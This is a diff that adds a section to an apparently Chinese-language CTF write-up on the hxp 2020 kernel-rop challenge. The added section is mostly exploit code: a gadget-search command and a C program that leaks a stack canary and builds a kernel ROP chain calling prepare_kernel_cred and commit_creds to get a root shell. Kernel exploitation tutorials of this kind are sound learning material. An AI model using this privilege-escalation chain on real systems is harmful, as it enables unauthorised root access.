@@ -14,6 +14,7 @@ comments: true
   - [5.2 ROP + native\_write\_cr4 + ret2usr(已失效)](#52-rop--native_write_cr4--ret2usr已失效)
   - [5.3 ROP提权](#53-rop提权)
     - [5.3.1 错误的尝试：gadget在不可执行的page中](#531-错误的尝试gadget在不可执行的page中)
+    - [5.3.2 正确的努力：先设置状态寄存器以达成目标](#532-正确的努力先设置状态寄存器以达成目标)
 
 
 # 例题: hxp 2020 kernel-rop<br>
@@ -378,6 +379,55 @@ ROP的逻辑是很简单的，但是实际上很难找到能用的gadget完成�
 为了去除这个问题，可以使用`ROPgadget`的`--range`参数，只搜索具有可执行的text段的gadget。<br>
 ```bash
 ROPgadget --binary vmlinux --range 0xffffffff81000000-0xffffffff81be8000 > gadgets.txt
+```
+对于找gadget的搜索技巧，可以参考:<br>
+```bash
+cat gadgets.txt | grep -E ': cmp.*ret'
+# -E 开启拓展表达式
+# : cmp 一定要出现 : cmp 字符
+```
+### 5.3.2 正确的努力：先设置状态寄存器以达成目标<br>
+找合适的gadget其实不容易，需要经验。<br>
+```c
+unsigned long pop_rdi_ret = 0xffffffff81006370;
+unsigned long cmp_esi_esi_ret = 0xffffffff81906934;
+unsigned long mov_rdi_rax_ja_pop_rbp_ret = 0xffffffff818c6ebd;
+unsigned long swapgs_pop_rbp_ret = 0xffffffff8100a55f;
+unsigned long iretq = 0xffffffff8100c0d9;
+int main(){
+    // step 0 : save status
+    save_status();
+
+    int fd =open_device();
+    // step 1: leak the canary
+    unsigned long tmp_buf[50];
+    unsigned long size=0x8*50;
+    read(fd,tmp_buf,size);
+    unsigned long canary = tmp_buf[16];
+    printf("canary: 0x%llx\n",canary);
+
+    // step 2: construct the payload
+    int off = 17;
+    tmp_buf[off++] = 0;
+    tmp_buf[off++] = 0;
+    tmp_buf[off++] = 0;
+    tmp_buf[off++] = pop_rdi_ret;
+    tmp_buf[off++] = 0;
+    tmp_buf[off++] = prepare_kernel_cred;
+    tmp_buf[off++] = cmp_esi_esi_ret;
+    tmp_buf[off++] = mov_rdi_rax_ja_pop_rbp_ret;
+    tmp_buf[off++] = 0 ;
+    tmp_buf[off++] = commit_creds;
+    tmp_buf[off++] = swapgs_pop_rbp_ret;
+    tmp_buf[off++] = 0; 
+    tmp_buf[off++] = iretq;
+    tmp_buf[off++] = (unsigned long )get_root_shell;
+    tmp_buf[off++] = user_cs;
+    tmp_buf[off++] = user_rflags;
+    tmp_buf[off++] = user_sp;
+    tmp_buf[off++] = user_ss;
+    write(fd,tmp_buf,size);   
+}
 ```
 
 
